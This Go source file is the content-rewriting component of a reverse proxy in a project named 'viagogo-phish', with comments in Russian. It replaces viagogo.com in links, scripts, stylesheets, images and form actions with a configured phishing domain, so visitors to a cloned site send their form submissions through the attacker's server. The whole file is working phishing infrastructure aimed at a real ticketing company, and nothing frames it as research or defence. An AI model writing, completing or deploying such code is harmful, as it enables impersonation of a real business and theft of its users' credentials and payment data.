package proxy

import (
    "bytes"
    "strings"

    "viagogo-phish/config"

    "github.com/PuerkitoBio/goquery"
)

type Rewriter struct {
    cfg *config.Config
}

func NewRewriter(cfg *config.Config) *Rewriter {
    return &Rewriter{cfg: cfg}
}

func (rw *Rewriter) RewriteBody(body []byte, contentType string) []byte {
    // Если это HTML — парсим и подменяем
    if strings.Contains(contentType, "text/html") {
        return rw.rewriteHTML(body)
    }
    // Для JS/CSS — тупая замена строк
    if strings.Contains(contentType, "javascript") || strings.Contains(contentType, "text/css") {
        return rw.rewriteText(body)
    }
    return body
}

func (rw *Rewriter) rewriteHTML(body []byte) []byte {
    doc, err := goquery.NewDocumentFromReader(bytes.NewReader(body))
    if err != nil {
        return body
    }

    // Подмена href в ссылках
    doc.Find("a[href]").Each(func(i int, s *goquery.Selection) {
        rw.replaceAttr(s, "href")
    })

    // Подмена src в скриптах, картинках и т.д.
    doc.Find("script[src]").Each(func(i int, s *goquery.Selection) {
        rw.replaceAttr(s, "src")
    })
    doc.Find("img[src]").Each(func(i int, s *goquery.Selection) {
        rw.replaceAttr(s, "src")
    })
    doc.Find("link[href]").Each(func(i int, s *goquery.Selection) {
        rw.replaceAttr(s, "href")
    })

    // Подмена action в формах
    doc.Find("form[action]").Each(func(i int, s *goquery.Selection) {
        rw.replaceAttr(s, "action")
    })

    // Подмена window.location в inline-скриптах
    doc.Find("script").Each(func(i int, s *goquery.Selection) {
        script := s.Text()
        script = strings.ReplaceAll(script, "www.viagogo.com", rw.cfg.PhishDomain)
        script = strings.ReplaceAll(script, "viagogo.com", rw.cfg.PhishDomain)
        script = strings.ReplaceAll(script, ".viagogo.", "."+rw.cfg.PhishDomain+".")
        s.SetText(script)
    })

    html, err := doc.Html()
    if err != nil {
        return body
    }
    return []byte(html)
}

func (rw *Rewriter) rewriteText(body []byte) []byte {
    s := string(body)
    s = strings.ReplaceAll(s, "www.viagogo.com", rw.cfg.PhishDomain)
    s = strings.ReplaceAll(s, "viagogo.com", rw.cfg.PhishDomain)
    s = strings.ReplaceAll(s, ".viagogo.", "."+rw.cfg.PhishDomain+".")
    return []byte(s)
}

func (rw *Rewriter) replaceAttr(s *goquery.Selection, attr string) {
    val, exists := s.Attr(attr)
    if !exists {
        return
    }
    newVal := strings.ReplaceAll(val, "www.viagogo.com", rw.cfg.PhishDomain)
    newVal = strings.ReplaceAll(newVal, "viagogo.com", rw.cfg.PhishDomain)
    newVal = strings.ReplaceAll(newVal, ".viagogo.", "."+rw.cfg.PhishDomain+".")
    // Если URL ведёт на viagogo — проксируем через нас
    if strings.Contains(val, "viagogo.com") || strings.HasPrefix(val, "/") {
        s.SetAttr(attr, newVal)
    }
}
